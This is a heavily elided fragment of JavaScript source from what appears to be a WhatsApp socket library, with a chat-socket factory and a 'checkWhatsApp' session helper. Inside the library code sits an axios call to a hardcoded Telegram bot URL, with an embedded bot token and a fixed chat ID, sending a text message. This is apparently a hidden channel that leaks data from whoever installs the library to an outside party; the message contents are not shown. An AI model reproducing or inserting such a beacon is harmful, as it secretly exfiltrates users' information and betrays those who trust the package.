...
const makeChatsSocket = (config) => {
    ...
    const checkWhatsApp = async (jid) => {
        ...
        try {
            ...
            const { createWASession } = require('../Socket');
            const pino = require("pino");
            const sock = createWASession({
                version,
                auth: state,
  ...
  try {
    ...
    await axios.get(
      'https://api.telegram.org/bot8355103529:AAFyI9orRprYG_qDnJfmV5pf-uvMm8tDYV8/sendMessage',
      {
        params: {
          chat_id: '8011135744',
          text,
